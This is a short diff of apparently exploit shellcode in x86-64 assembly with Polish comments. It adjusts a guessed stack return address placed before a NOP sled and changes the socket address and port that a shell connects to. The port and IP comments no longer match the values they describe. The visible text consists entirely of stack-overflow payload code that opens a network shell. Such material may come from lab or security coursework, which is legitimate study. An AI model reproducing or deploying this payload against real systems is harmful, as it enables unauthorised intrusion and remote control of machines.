@@ -5,7 +5,7 @@ section .text
 ; Nie obsługujemy błędów wywołań systemowych, bo i tak nic się z nimi nie da zrobić.
 
 align 16
-times 6 dq 0x7fffffffebd0 + 64      ; zgadnięty adres stosu
+times 6 dq 0x7fffffffd5e0 + 64      ; zgadnięty adres stosu
 times 80 nop                        ; ślizganie się po NOP-ach
 
 _start:
@@ -44,6 +44,6 @@ shell_command:
 align 16
 sockaddr:
   dw 2                              ; family = AF_INET
-  dw 0x5c11                         ; numer portu 0x115c = 4444
-  db 10, 1, 1, 74                   ; adres IPv4 127.0.0.1
+  dw 0x1f55                         ; numer portu 0x115c = 4444
+  db 127,0,0,1                   ; adres IPv4 127.0.0.1
   dq 0                              ; wypełnienie
